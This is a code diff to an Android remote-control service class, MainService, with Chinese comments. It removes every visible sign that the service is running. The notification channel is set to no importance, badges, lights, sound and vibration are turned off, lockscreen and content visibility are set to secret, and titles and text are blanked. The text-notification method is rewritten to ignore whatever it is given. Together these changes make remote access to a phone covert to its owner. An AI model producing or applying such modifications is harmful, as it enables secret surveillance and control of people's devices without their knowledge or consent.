@@ -661,12 +661,16 @@ class MainService : Service() {
             val channelName = "远程控制服务"
             val channel = NotificationChannel(
                 channelId,
-                channelName, NotificationManager.IMPORTANCE_MIN
+                channelName, NotificationManager.IMPORTANCE_NONE
             ).apply {
                 description = "远程控制服务通道"
+                // 通知不显示在状态栏
+                setShowBadge(false)  // 不显示角标
             }
-            channel.lightColor = Color.BLUE
-            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET
+            // 禁用所有通知灯光和声音
+            channel.enableLights(false)
+            channel.enableVibration(false)
+            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET  // 锁屏上也不显示
             notificationManager.createNotificationChannel(channel)
             channelId
         } else {
@@ -691,15 +695,19 @@ class MainService : Service() {
         val notification = notificationBuilder
             .setOngoing(true)
             .setSmallIcon(R.mipmap.ic_stat_logo)
-            .setDefaults(0)
+            .setDefaults(0)  // 没有默认行为
             .setAutoCancel(false)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setContentTitle(Constants.DEFAULT_NOTIFY_TITLE)
-            .setContentText("")
+            .setPriority(NotificationCompat.PRIORITY_MIN)  // 最低优先级
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // 隐藏内容
+            .setContentTitle("")  // 空标题
+            .setContentText("")   // 空内容
+            .setShowWhen(false)   // 不显示时间
             .setOnlyAlertOnce(true)
+            .setSound(null)       // 无声音
+            .setVibrate(null)     // 无振动
+            .setLights(0, 0, 0)   // 无LED灯
             .setContentIntent(pendingIntent)
             .setColor(ContextCompat.getColor(this, R.color.primary))
-            .setWhen(System.currentTimeMillis())
             .build()
         startForeground(Constants.DEFAULT_NOTIFY_ID, notification)
     }
@@ -756,13 +764,14 @@ class MainService : Service() {
     }
 
     private fun setTextNotification(_title: String?, _text: String?) {
-        val title = _title ?: Constants.DEFAULT_NOTIFY_TITLE
-        val text = _text ?: translate(Constants.DEFAULT_NOTIFY_TEXT)
+        // 忽略传入的标题和文本，保持通知隐藏
         val notification = notificationBuilder
             .clearActions()
             .setStyle(null)
-            .setContentTitle(title)
-            .setContentText(text)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setContentTitle("")  // 空标题
+            .setContentText("")   // 空内容
+            .setShowWhen(false)   // 不显示时间
             .build()
         notificationManager.notify(Constants.DEFAULT_NOTIFY_ID, notification)
     }
